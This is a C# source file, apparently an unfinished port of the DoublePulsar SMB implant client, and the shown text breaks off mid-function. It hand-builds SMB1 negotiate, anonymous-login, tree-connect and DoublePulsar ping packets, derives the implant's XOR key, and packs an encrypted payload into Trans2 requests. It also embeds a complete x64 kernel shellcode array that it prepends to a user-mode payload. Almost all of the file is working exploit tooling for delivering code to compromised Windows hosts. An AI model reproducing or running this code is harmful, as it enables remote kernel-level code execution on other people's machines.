using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using static System.Runtime.InteropServices.JavaScript.JSType;

/* Sources used: 
https://github.com/povlteksttv/Eternalblue/blob/master/Eternalblue/Program.cs
https://github.com/HynekPetrak/doublepulsar-detection-csharp/blob/master/DoublepulsarDetectionLib/DetectDoublePulsar.cs
https://github.com/DeadmanLabs/EternalBlueScanner/blob/master/EternalBlue_Scanner/EternalBlue_Scanner/EternalBlueToolkit.cs
*/
namespace DoublePulsar
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
        public struct NETBIOS_HEADER
        {
            public uint MessageTypeAndSize;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
        public struct SMB_HEADER
        {
            public uint protocol;
            public byte command;
            public byte errorClass;
            public byte _reserved;
            public ushort errorCode;
            public byte flags;
            public ushort flags2;
            public ushort PIDHigh;
            public ulong SecurityFeatures;
            public ushort reserved;
            public ushort TID;
            public ushort PIDLow;
            public ushort UID;
            public ushort MID;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
        public struct SMB_COM_TREE_CONNECT_ANDX_REQUEST
        {
            public byte WordCount;
            public byte AndXCommand;
            public byte AndXReserved;
            public ushort AndXOffset;
            public ushort Flags;
            public ushort PasswordLength;
            public ushort ByteCount;
            //SMBData added manually
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
        public struct SMB_COM_SESSION_SETUP_ANDX_RESPONSE
        {
            public byte WordCount;
            public byte AndxCommand;
            public byte reserved;
            public ushort AndxOffset;
            public ushort action;
            public ushort ByteCount;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
        public struct SMB_COM_SESSION_SETUP_ANDX_REQUEST
        {
            public byte WordCount;
            public byte AndxCommand;
            public byte reserved1;
            public ushort AndxOffset;
            public ushort MaxBuffer;
            public ushort MaxMpxCount;
            public ushort VcNumber;
            public uint SessionKey;
            public ushort OEMPasswordLen;
            public ushort UnicodePasswordLen;
            public uint Reserved2;
            public uint Capabilities;
            public ushort ByteCount;
            //SMB Data added manually
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
        public struct SMB_COM_NEGOTIATE_REQUEST
        {
            public byte WordCount;
            public ushort ByteCount;
            //Dialects are added manually
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
        public struct DOUBLEPULSAR_PING
        {
            public byte WordCount;
            public ushort TotalParameterCount;
            public ushort TotalDataCount;
            public ushort MaxParameterCount;
            public ushort MaxDataCount;
            public byte MaxSetupCount;
            public byte Reserved;
            public ushort Flags;
            public uint Timeout;
            public ushort Reserved2;
            public ushort ParameterCount;
            public ushort ParameterOffset;
            public ushort DataCount;
            public ushort DataOffset;
            public byte setupcount;
            public byte reserved3;
            public ushort subcommand;
            public ushort ByteCount;
            public byte padding;
            //Parameters added manually
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
        public struct SMB_COM_TRANSACTION2_SECONDARY_REQUEST
        {
            public byte WordCount;
            public ushort TotalParameterCount;
            public ushort TotalDataCount;
            public ushort MaxParameterCount;
            public ushort MaxDataCount;
            public byte MaxSetupCount;
            public byte Reserved;
            public ushort Flags;
            public uint Timeout;
            public ushort Reserved2;
            public ushort ParameterCount;
            public ushort ParameterOffset;
            public ushort DataCount;
            public ushort DataOffset;
            public byte setupcount;
            public byte reserved3;
            public ushort subcommand;
            public ushort ByteCount;
            public byte padding;
            //Parameters added manually
            //SMBData added manually
        }

        static public byte[] MakeTrans2Packet(Socket sock, ushort TID, ushort UID, byte[] param, byte[] encrypted_payload)
        {
            //figure this out here ??
            /*
            NETBIOS_HEADER NTHeader = new NETBIOS_HEADER
            {
                MessageTypeAndSize = 0x35100000
            };*/

            SMB_HEADER header = new SMB_HEADER
            {
                protocol = 0x424d53ff,
                command = 0x33,
                errorClass = 0x00,
                _reserved = 0x00,
                errorCode = 0x0000,
                flags = 0x18,
                flags2 = 0xc007,
                PIDHigh = 0x0000,
                SecurityFeatures = 0x0000000000000000,
                reserved = 0x0000,
                TID = TID,
                PIDLow = 0xfeff,
                UID = UID,
                MID = 0x0042
            };
            //byte[] headerBytes = GetBytes(NTHeader).Concat(GetBytes(header)).ToArray();
            byte[] headerBytes = GetBytes(header);

            //uint doublepulsar_execute_timeout_command = 0x001a8925;
            //doublepulsar_execute_timeout_command = IPAddress.HostToNetworkOrder(doublepulsar_execute_timeout_command);

            SMB_COM_TRANSACTION2_SECONDARY_REQUEST transaction2SecondaryRequest = new SMB_COM_TRANSACTION2_SECONDARY_REQUEST
            {
                WordCount = 15,
                TotalParameterCount = 12,
                TotalDataCount = 0x1000,
                MaxParameterCount = 1,
                MaxDataCount = 0x0000,
                MaxSetupCount = 0x00,
                Reserved = 0x00,
                Flags = 0x00,
                Timeout = 0x001a8925, // [25,89,1a0,00] in packet.  0x001a8925
                Reserved2 = 0x00,
                ParameterCount = 12,

                //where in the packet is the location of the parameters
                //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> < PARAMETERS ARE HERE >
                ParameterOffset = 0x0042, //0x0035 OR ParameterDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> (parameters=12)
                DataCount = 0, //will be updated with the values below

                //where in the packet is the location of the SMBDATA
                //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) + (PARAMETERS) -> < SMBDATA IS HERE>
                DataOffset = 0x004e, // DataDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) (parameters=12) -> ( SMBData=4096 MAX)
                setupcount = 1, //0x01;
                reserved3 = 0x00,
                subcommand = 0x000E,
                ByteCount = 0, //will be updated with the values below
                padding = 0x00
            };

            //ushort TotalDataCount = (ushort)Marshal.SizeOf(encrypted_payload);
            //ushort ByteCountLocal = (ushort)TotalDataCount;
            //ByteCountLocal += 13;

            transaction2SecondaryRequest.TotalDataCount = (ushort)Marshal.SizeOf(encrypted_payload);
            transaction2SecondaryRequest.DataCount = (ushort)Marshal.SizeOf(encrypted_payload);

            int byteCountOfEncryptedPayload = Marshal.SizeOf(encrypted_payload) + 13;
            transaction2SecondaryRequest.ByteCount = (ushort)byteCountOfEncryptedPayload;

            //update timeout to be DoublePulsar EXEC command
            //int timeout = (time * 16) + 3;
            //transaction2SecondaryRequest.DataDisplacement = BitConverter.ToUInt16(new byte[] { 0xd0, BitConverter.GetBytes(timeout)[0] }, 0);

            //Merge SMBHeader with the transaction2SecondaryRequest
            byte[] transaction2SecondaryRequestBytes = GetBytes(transaction2SecondaryRequest);
            byte[] pkt = headerBytes.Concat(transaction2SecondaryRequestBytes).ToArray();

            List<byte> Parameters = new List<byte>();
            Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));

            //convert params to byte
            byte[] paramBytes = GetBytes(param);

            //copy doublepulsar parameters to parameters here
            Array.Copy(paramBytes, Parameters.ToArray(), 12);

            //append the parameteters to the end of pkt
            pkt = pkt.Concat(Parameters.ToArray()).ToArray(); //Collect it all

            //SMBData dynamic generation
            int DataSize = Marshal.SizeOf(encrypted_payload);

            List<byte> SMBData = new List<byte>();
            SMBData.AddRange(Enumerable.Repeat((byte)0x00, DataSize));
            //SMBData.AddRange(Enumerable.Repeat((byte)0x00, DataSize));

            //copy doublepulsar exec data to SMBData here
            Array.Copy(encrypted_payload, SMBData.ToArray(), DataSize);

            //append it to the end of pkt
            pkt = pkt.Concat(SMBData.ToArray()).ToArray(); //Collect it all

            SendSMBMessage(sock, pkt, true);
            return ReceiveSMBMessage(sock);
            //return pkt;
        }


        static public byte[] SMB1AnonymousLogin(Socket sock)
        {
            SMB_HEADER header = new SMB_HEADER
            {
                protocol = 0x424d53ff,
                command = 0x73,
                errorClass = 0x00,
                _reserved = 0x00,
                errorCode = 0x0000,
                flags = 0x18,
                flags2 = 0xc007,
                PIDHigh = 0x0000,
                SecurityFeatures = 0x0000000000000000,
                reserved = 0x0000,
                TID = 0xfeff,
                PIDLow = 0x0000,
                UID = 0x0000,
                MID = 0x0040
            };
            byte[] headerBytes = GetBytes(header);

            SMB_COM_SESSION_SETUP_ANDX_REQUEST AndxRequest = new SMB_COM_SESSION_SETUP_ANDX_REQUEST
            {
                WordCount = 0x0d,
                AndxCommand = 0xff,
                reserved1 = 0x00,
                AndxOffset = 0x0088,
                MaxBuffer = 0x1104,
                MaxMpxCount = 0x00a0,
                VcNumber = 0x0000,
                SessionKey = 0x00000000,
                OEMPasswordLen = 0x0001,
                UnicodePasswordLen = 0x0000,
                Reserved2 = 0x00000000,
                Capabilities = 0x000000d4
            };
            List<byte> SMBData = new List<byte>();
            byte[] nulls = { 0x00, 0x00, 0x00, 0x00, 0x00 };
            SMBData.AddRange(nulls);
            SMBData.AddRange(Encoding.UTF8.GetBytes("W\0i\0n\0d\0o\0w\0s\0 \02\00\00\00\0 \02\01\09\05\0\0\0"));
            SMBData.AddRange(Encoding.UTF8.GetBytes("W\0i\0n\0d\0o\0w\0s\0 \02\00\00\00\0 \05\0.\00\0\0\0"));
            AndxRequest.ByteCount = (ushort)SMBData.Count;

            byte[] AndxRequestBytes = GetBytes(AndxRequest).Concat(SMBData.ToArray()).ToArray();
            byte[] pkt = headerBytes.Concat(AndxRequestBytes).ToArray();
            SendSMBMessage(sock, pkt, true);
            return ReceiveSMBMessage(sock);
        }

        static public byte[] TreeConnectAndXRequest(string target, Socket sock, ushort UID)
        {
            SMB_HEADER header = new SMB_HEADER
            {
                protocol = 0x424d53ff,
                command = 0x75,
                errorClass = 0x00,
                _reserved = 0x00,
                errorCode = 0x0000,
                flags = 0x18,
                flags2 = 0x2001,
                PIDHigh = 0x0000,
                SecurityFeatures = 0x0000000000000000,
                reserved = 0x0000,
                TID = 0xfeff,
                PIDLow = 0x4b2f,
                UID = UID,
                MID = 0x5ec5
            };
            byte[] headerBytes = GetBytes(header);

            SMB_COM_TREE_CONNECT_ANDX_REQUEST treeConnectAndxRequest = new SMB_COM_TREE_CONNECT_ANDX_REQUEST
            {
                WordCount = 0x04,
                AndXCommand = 0xff,
                AndXReserved = 0x00,
                AndXOffset = 0x0000,
                Flags = 0x0000,
                PasswordLength = 0x0001,
            };
            byte[] PathServiceBytes = Encoding.ASCII.GetBytes(@"\\" + target + @"\IPC$" + "\0?????\0");
            List<byte> SMBData = new List<byte>();
            SMBData.Add(0x00); //Password
            SMBData.AddRange(PathServiceBytes); //Path + Service
            treeConnectAndxRequest.ByteCount = (ushort)SMBData.Count;

            byte[] TreeConnectAndxRequestBytes = GetBytes(treeConnectAndxRequest).Concat(SMBData.ToArray()).ToArray();
            byte[] pkt = headerBytes.Concat(TreeConnectAndxRequestBytes).ToArray();

            SendSMBMessage(sock, pkt, true);
            return ReceiveSMBMessage(sock);
        }

        static public byte[] DoublepulsarPingRequest(Socket sock, ushort UID, ushort TID)
        {
            SMB_HEADER header = new SMB_HEADER
            {
                protocol = 0x424d53ff,
                command = 0x32,
                errorClass = 0x00,
                _reserved = 0x00,
                errorCode = 0x0000,
                flags = 0x18,
                flags2 = 0xc007,
                PIDHigh = 0x0000,
                SecurityFeatures = 0x0000000000000000,
                reserved = 0x0000,
                TID = TID, /*0xfeff*/
                PIDLow = 0xfeff, /* 0x4b2f */
                UID = UID,
                MID = 0x0041
            };
            byte[] headerBytes = GetBytes(header);

            DOUBLEPULSAR_PING ping = new DOUBLEPULSAR_PING
            {
                WordCount = 15,
                TotalParameterCount = 0x0C,
                TotalDataCount = 0x0000,

                MaxParameterCount = 0x0100,
                MaxDataCount = 0x0000,
                MaxSetupCount = 0x00,
                Reserved = 0x00,
                Flags = 0x0000,

                //timeout = SWAP_WORD(0x0134ee00),
                Timeout = 0x00ee3401,

                Reserved2 = 0x0000,

                ParameterCount = 0x0C,

                ParameterOffset = 0x0042,

                DataCount = 0x0000,
                DataOffset = 0x004e,
                setupcount = 1,
                reserved3 = 0x00,
                subcommand = 0x000e,
                ByteCount = 0xD,
                padding = 0x00
            };

            List<byte> Parameters = new List<byte>();
            Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
            byte[] paramz = Parameters.ToArray();

            //byte[] DoublepulsarPINGPKT = GetBytes(ping).Concat(Parameters.ToArray()).ToArray();
            byte[] DoublepulsarPINGPKT = GetBytes(ping).ToArray();
            byte[] pkt = headerBytes.Concat(DoublepulsarPINGPKT).ToArray();
            pkt = pkt.Concat(paramz.ToArray()).ToArray();

            SendSMBMessage(sock, pkt, true);
            return ReceiveSMBMessage(sock);
        }

        static public byte[] MakeKernelShellcode()
        {
            byte[] shellcode = {
                0xB9,0x82,0x00,0x00,0xC0,0x0F,0x32,0x48,0xBB,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,
                0xFF,0x89,0x53,0x04,0x89,0x03,0x48,0x8D,0x05,0x0A,0x00,0x00,0x00,0x48,0x89,0xC2,
                0x48,0xC1,0xEA,0x20,0x0F,0x30,0xC3,0x0F,0x01,0xF8,0x65,0x48,0x89,0x24,0x25,0x10,
                0x00,0x00,0x00,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x50,0x53,0x51,0x52,
                0x56,0x57,0x55,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x41,
                0x56,0x41,0x57,0x6A,0x2B,0x65,0xFF,0x34,0x25,0x10,0x00,0x00,0x00,0x41,0x53,0x6A,
                0x33,0x51,0x4C,0x89,0xD1,0x48,0x83,0xEC,0x08,0x55,0x48,0x81,0xEC,0x58,0x01,0x00,
                0x00,0x48,0x8D,0xAC,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x9D,0xC0,0x00,0x00,0x00,
                0x48,0x89,0xBD,0xC8,0x00,0x00,0x00,0x48,0x89,0xB5,0xD0,0x00,0x00,0x00,0x48,0xA1,
                0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,0xFF,0x48,0x89,0xC2,0x48,0xC1,0xEA,0x20,0x48,
                0x31,0xDB,0xFF,0xCB,0x48,0x21,0xD8,0xB9,0x82,0x00,0x00,0xC0,0x0F,0x30,0xFB,0xE8,
                0x38,0x00,0x00,0x00,0xFA,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x48,0x83,
                0xEC,0x78,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x41,0x5B,0x41,0x5A,0x41,0x59,
                0x41,0x58,0x5D,0x5F,0x5E,0x5A,0x59,0x5B,0x58,0x65,0x48,0x8B,0x24,0x25,0x10,0x00,
                0x00,0x00,0x0F,0x01,0xF8,0xFF,0x24,0x25,0xF8,0x0F,0xD0,0xFF,0x56,0x41,0x57,0x41,
                0x56,0x41,0x55,0x41,0x54,0x53,0x55,0x48,0x89,0xE5,0x66,0x83,0xE4,0xF0,0x48,0x83,
                0xEC,0x20,0x4C,0x8D,0x35,0xE3,0xFF,0xFF,0xFF,0x65,0x4C,0x8B,0x3C,0x25,0x38,0x00,
                0x00,0x00,0x4D,0x8B,0x7F,0x04,0x49,0xC1,0xEF,0x0C,0x49,0xC1,0xE7,0x0C,0x49,0x81,
                0xEF,0x00,0x10,0x00,0x00,0x49,0x8B,0x37,0x66,0x81,0xFE,0x4D,0x5A,0x75,0xEF,0x41,
                0xBB,0x5C,0x72,0x11,0x62,0xE8,0x18,0x02,0x00,0x00,0x48,0x89,0xC6,0x48,0x81,0xC6,
                0x08,0x03,0x00,0x00,0x41,0xBB,0x7A,0xBA,0xA3,0x30,0xE8,0x03,0x02,0x00,0x00,0x48,
                0x89,0xF1,0x48,0x39,0xF0,0x77,0x11,0x48,0x8D,0x90,0x00,0x05,0x00,0x00,0x48,0x39,
                0xF2,0x72,0x05,0x48,0x29,0xC6,0xEB,0x08,0x48,0x8B,0x36,0x48,0x39,0xCE,0x75,0xE2,
                0x49,0x89,0xF4,0x31,0xDB,0x89,0xD9,0x83,0xC1,0x04,0x81,0xF9,0x00,0x00,0x01,0x00,
                0x0F,0x8D,0x66,0x01,0x00,0x00,0x4C,0x89,0xF2,0x89,0xCB,0x41,0xBB,0x66,0x55,0xA2,
                0x4B,0xE8,0xBC,0x01,0x00,0x00,0x85,0xC0,0x75,0xDB,0x49,0x8B,0x0E,0x41,0xBB,0xA3,
                0x6F,0x72,0x2D,0xE8,0xAA,0x01,0x00,0x00,0x48,0x89,0xC6,0xE8,0x50,0x01,0x00,0x00,
                0x41,0x81,0xF9,0xBF,0x77,0x1F,0xDD,0x75,0xBC,0x49,0x8B,0x1E,0x4D,0x8D,0x6E,0x10,
                0x4C,0x89,0xEA,0x48,0x89,0xD9,0x41,0xBB,0xE5,0x24,0x11,0xDC,0xE8,0x81,0x01,0x00,
                0x00,0x6A,0x40,0x68,0x00,0x10,0x00,0x00,0x4D,0x8D,0x4E,0x08,0x49,0xC7,0x01,0x00,
                0x10,0x00,0x00,0x4D,0x31,0xC0,0x4C,0x89,0xF2,0x31,0xC9,0x48,0x89,0x0A,0x48,0xF7,
                0xD1,0x41,0xBB,0x4B,0xCA,0x0A,0xEE,0x48,0x83,0xEC,0x20,0xE8,0x52,0x01,0x00,0x00,
                0x85,0xC0,0x0F,0x85,0xC8,0x00,0x00,0x00,0x49,0x8B,0x3E,0x48,0x8D,0x35,0xE9,0x00,
                0x00,0x00,0x31,0xC9,0x66,0x03,0x0D,0xD7,0x01,0x00,0x00,0x66,0x81,0xC1,0xF9,0x00,
                0xF3,0xA4,0x48,0x89,0xDE,0x48,0x81,0xC6,0x08,0x03,0x00,0x00,0x48,0x89,0xF1,0x48,
                0x8B,0x11,0x4C,0x29,0xE2,0x51,0x52,0x48,0x89,0xD1,0x48,0x83,0xEC,0x20,0x41,0xBB,
                0x26,0x40,0x36,0x9D,0xE8,0x09,0x01,0x00,0x00,0x48,0x83,0xC4,0x20,0x5A,0x59,0x48,
                0x85,0xC0,0x74,0x18,0x48,0x8B,0x80,0xC8,0x02,0x00,0x00,0x48,0x85,0xC0,0x74,0x0C,
                0x48,0x83,0xC2,0x4C,0x8B,0x02,0x0F,0xBA,0xE0,0x05,0x72,0x05,0x48,0x8B,0x09,0xEB,
                0xBE,0x48,0x83,0xEA,0x4C,0x49,0x89,0xD4,0x31,0xD2,0x80,0xC2,0x90,0x31,0xC9,0x41,
                0xBB,0x26,0xAC,0x50,0x91,0xE8,0xC8,0x00,0x00,0x00,0x48,0x89,0xC1,0x4C,0x8D,0x89,
                0x80,0x00,0x00,0x00,0x41,0xC6,0x01,0xC3,0x4C,0x89,0xE2,0x49,0x89,0xC4,0x4D,0x31,
                0xC0,0x41,0x50,0x6A,0x01,0x49,0x8B,0x06,0x50,0x41,0x50,0x48,0x83,0xEC,0x20,0x41,
                0xBB,0xAC,0xCE,0x55,0x4B,0xE8,0x98,0x00,0x00,0x00,0x31,0xD2,0x52,0x52,0x41,0x58,
                0x41,0x59,0x4C,0x89,0xE1,0x41,0xBB,0x18,0x38,0x09,0x9E,0xE8,0x82,0x00,0x00,0x00,
                0x4C,0x89,0xE9,0x41,0xBB,0x22,0xB7,0xB3,0x7D,0xE8,0x74,0x00,0x00,0x00,0x48,0x89,
                0xD9,0x41,0xBB,0x0D,0xE2,0x4D,0x85,0xE8,0x66,0x00,0x00,0x00,0x48,0x89,0xEC,0x5D,
                0x5B,0x41,0x5C,0x41,0x5D,0x41,0x5E,0x41,0x5F,0x5E,0xC3,0xE9,0xB5,0x00,0x00,0x00,
                0x4D,0x31,0xC9,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x3C,0x61,0x7C,0x02,0x2C,0x20,
                0x41,0x01,0xC1,0x38,0xE0,0x75,0xEC,0xC3,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,
                0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x12,0x48,0x8B,0x72,0x50,0x48,0x0F,
                0xB7,0x4A,0x4A,0x45,0x31,0xC9,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,
                0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xEE,0x45,0x39,0xD9,0x75,0xDA,0x4C,0x8B,0x7A,
                0x20,0xC3,0x4C,0x89,0xF8,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x89,0xC2,0x8B,
                0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x01,0xD0,0x50,0x8B,
                0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,
                0x48,0x01,0xD6,0xE8,0x78,0xFF,0xFF,0xFF,0x45,0x39,0xD9,0x75,0xEC,0x58,0x44,0x8B,
                0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,
                0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,
                0x5B,0x41,0x53,0xFF,0xE0,0x56,0x41,0x57,0x55,0x48,0x89,0xE5,0x48,0x83,0xEC,0x20,
                0x41,0xBB,0xDA,0x16,0xAF,0x92,0xE8,0x4D,0xFF,0xFF,0xFF,0x31,0xC9,0x51,0x51,0x51,
                0x51,0x41,0x59,0x4C,0x8D,0x05,0x1A,0x00,0x00,0x00,0x5A,0x48,0x83,0xEC,0x20,0x41,
                0xBB,0x46,0x45,0x1B,0x22,0xE8,0x68,0xFF,0xFF,0xFF,0x48,0x89,0xEC,0x5D,0x41,0x5F,
                0x5E,0xC3};
            return shellcode;
        }

        static public byte[] MakeKernelUserPayload(byte[] ring3)
        {
            byte[] shellcode = MakeKernelShellcode();
            byte[] length = BitConverter.GetBytes((UInt16)ring3.Length);
            shellcode = shellcode.Concat(length).ToArray();
            shellcode = shellcode.Concat(ring3).ToArray();
            return shellcode;
        }

        static public SMB_HEADER SMB_HeaderFromBytes(byte[] arr)
        {
            SMB_HEADER str = new SMB_HEADER();
            int size = Marshal.SizeOf(str);
            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.Copy(arr, 0, ptr, size);
            str = (SMB_HEADER)Marshal.PtrToStructure(ptr, str.GetType());
            Marshal.FreeHGlobal(ptr);
            return str;
        }

        public static string HexDump(byte[] bytes, int bytesPerLine = 16)
        {
            if (bytes == null) return "<null>";
            int bytesLength = bytes.Length;

            char[] HexChars = "0123456789ABCDEF".ToCharArray();

            int firstHexColumn =
                  8                   // 8 characters for the address
                + 3;                  // 3 spaces

            int firstCharColumn = firstHexColumn
                + bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space
                + (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
                + 2;                  // 2 spaces 

            int lineLength = firstCharColumn
                + bytesPerLine           // - characters to show the ascii value
                + Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)

            char[] line = (new System.String(' ', lineLength - 2) + Environment.NewLine).ToCharArray();
            int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
            StringBuilder result = new StringBuilder(expectedLines * lineLength);

            for (int i = 0; i < bytesLength; i += bytesPerLine)
            {
                line[0] = HexChars[(i >> 28) & 0xF];
                line[1] = HexChars[(i >> 24) & 0xF];
                line[2] = HexChars[(i >> 20) & 0xF];
                line[3] = HexChars[(i >> 16) & 0xF];
                line[4] = HexChars[(i >> 12) & 0xF];
                line[5] = HexChars[(i >> 8) & 0xF];
                line[6] = HexChars[(i >> 4) & 0xF];
                line[7] = HexChars[(i >> 0) & 0xF];

                int hexColumn = firstHexColumn;
                int charColumn = firstCharColumn;

                for (int j = 0; j < bytesPerLine; j++)
                {
                    if (j > 0 && (j & 7) == 0) hexColumn++;
                    if (i + j >= bytesLength)
                    {
                        line[hexColumn] = ' ';
                        line[hexColumn + 1] = ' ';
                        line[charColumn] = ' ';
                    }
                    else
                    {
                        byte b = bytes[i + j];
                        line[hexColumn] = HexChars[(b >> 4) & 0xF];
                        line[hexColumn + 1] = HexChars[b & 0xF];
                        line[charColumn] = asciiSymbol(b);
                    }
                    hexColumn += 3;
                    charColumn++;
                }
                result.Append(line);
            }
            return result.ToString();
        }

        static char asciiSymbol(byte val)
        {
            if (val < 32) return '.';  // Non-printable ASCII
            if (val < 127) return (char)val;   // Normal ASCII
                                               // Handle the hole in Latin-1
            if (val == 127) return '.';
            if (val < 0x90) return "€.‚ƒ„…†‡ˆ‰Š‹Œ.Ž."[val & 0xF];
            if (val < 0xA0) return ".‘’“”•–—˜™š›œ.žŸ"[val & 0xF];
            if (val == 0xAD) return '.';   // Soft hyphen: this symbol is zero-width even in monospace fonts
            return (char)val;   // Normal Latin-1
        }

        static public byte[] ClientNegotiate(Socket sock)
        {
            SMB_HEADER header = new SMB_HEADER
            {
                protocol = 0x424d53ff,
                command = 0x72,
                errorClass = 0x00,
                _reserved = 0x00,
                errorCode = 0x0000,
                flags = 0x18,
                flags2 = 0x2801,
                PIDHigh = 0x0000,
                SecurityFeatures = 0x0000000000000000,
                reserved = 0x0000,
                TID = 0x0000,
                PIDLow = 0x4b2f,
                UID = 0x0000,
                MID = 0x5ec5
            };
            byte[] headerBytes = GetBytes(header);

            SMB_COM_NEGOTIATE_REQUEST req = new SMB_COM_NEGOTIATE_REQUEST
            {
                WordCount = 0x00
            };
            List<byte> dialects = new List<byte>();
            dialects.AddRange(Encoding.UTF8.GetBytes("\x2LANMAN1.0\0"));
            dialects.AddRange(Encoding.UTF8.GetBytes("\x2LM1.2X002\0"));
            dialects.AddRange(Encoding.UTF8.GetBytes("\x2NT LANMAN 1.0\0"));
            dialects.AddRange(Encoding.UTF8.GetBytes("\x2NT LM 0.12\0"));
            req.ByteCount = (ushort)dialects.Count;

            byte[] negotitateRequest = GetBytes(req).Concat(dialects.ToArray()).ToArray();
            string hex = BitConverter.ToString(negotitateRequest);
            byte[] pkt = headerBytes.Concat(negotitateRequest).ToArray();
            SendSMBMessage(sock, pkt, true);
            return ReceiveSMBMessage(sock);
        }


        static public byte[] SetNetBiosHeader(byte[] pkt)
        {
            uint size = (uint)pkt.Length;
            byte[] intBytes = BitConverter.GetBytes(size).Reverse().ToArray();
            NETBIOS_HEADER netbios_header = new NETBIOS_HEADER();
            netbios_header.MessageTypeAndSize = BitConverter.ToUInt32(intBytes, 0);
            byte[] netbios_header_packet = GetBytes(netbios_header);
            byte[] fullMessage = netbios_header_packet.Concat(pkt).ToArray();
            return fullMessage;
        }

        static public void SendSMBMessage(Socket sock, byte[] pkt, bool SetHeader)
        {
            //Calculate and set Message Length for NetBios Header
            if (SetHeader)
            {
                pkt = SetNetBiosHeader(pkt);
            }
            try
            {
                sock.Send(pkt);
            }
            catch (Exception e)
            {
                Console.WriteLine("Socket Error, during sending: " + e.Message);
            }
        }

        static public byte[] ReceiveSMBMessage(Socket sock)
        {
            byte[] response = new byte[1024];
            try
            {
                sock.Receive(response);
            }
            catch (Exception e)
            {
                Console.WriteLine("Socket Error, during receive: " + e.Message);
            }
            return response.Skip(4).ToArray();
        }

        static public byte[] GetBytes(object str)
        {
            int size = Marshal.SizeOf(str);

            byte[] arr = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(str, ptr, true);
            Marshal.Copy(ptr, arr, 0, size);
            Marshal.FreeHGlobal(ptr);
            return arr;
        }

        public static UInt32 LE2INT(byte[] data)
        {
            UInt32 b;
            b = data[3];
            b <<= 8;
            b += data[2];
            b <<= 8;
            b += data[1];
            b <<= 8;
            b += data[0];
            return b;
        }

        //https://stackoverflow.com/questions/2350099/how-to-convert-an-int-to-a-little-endian-byte-array
        /*
        BitConverter.GetBytes(1000).Reverse<byte>().ToArray();
        
        OR
        if (BitConverter.IsLittleEndian)
        {
            int someInteger = 100;
            byte[] bytes = BitConverter.GetBytes(someInteger);
            int convertedFromBytes = BitConverter.ToInt32(bytes, 0);
        }
        OR
        byte[] IntToLittleEndian(int data)
        {
          var output = new byte[sizeof(int)];
          BinaryPrimitives.WriteInt32LittleEndian(output, data);
          return output;
        }
        */
        public static byte[] INT2LE(UInt32 data)
        {
            byte[] b = new byte[4];
            b[0] = (byte)data;
            b[1] = (byte)(((uint)data >> 8) & 0xFF);
            b[2] = (byte)(((uint)data >> 16) & 0xFF);
            b[3] = (byte)(((uint)data >> 24) & 0xFF);
            return b;
        }

        public static byte[] Slice(byte[] data, int index, int length)
        {
            byte[] result = new byte[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        public static UInt32 calculate_doublepulsar_xor_key(UInt32 s)
        {
            UInt32 x;
            x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)));
            x = x & 0xffffffff;  // this line was added just to truncate to 32 bits
            return x;
        }

        // The arch is adjacent to the XOR key in the SMB signature
        public static string calculate_doublepulsar_arch(UInt64 s)
        {
            if ((s & 0xffffffff00000000) == 0)
            {
                return "x86 (32-bit)";
            }
            else
            {
                return "x64 (64-bit)";
            }
        }

        //https://social.msdn.microsoft.com/Forums/vstudio/en-US/0f63c7f5-02f5-444c-b853-ea779ce005cf/file-encryption-using-multiple-xor-keys?forum=csharpgeneral
        private static void XorEncrypt(Byte[] message, UInt32[] Keys)
        {
            for (Int32 i = 0; i < message.Length - 1; i++)
            {
                message[i] ^= (byte)Keys[i % 4];
            }
        }

        public static byte[] XorDecryptFunc(Byte[] message, int key)
        {
            byte[] readedBytes;
            byte[] xoredBytes;

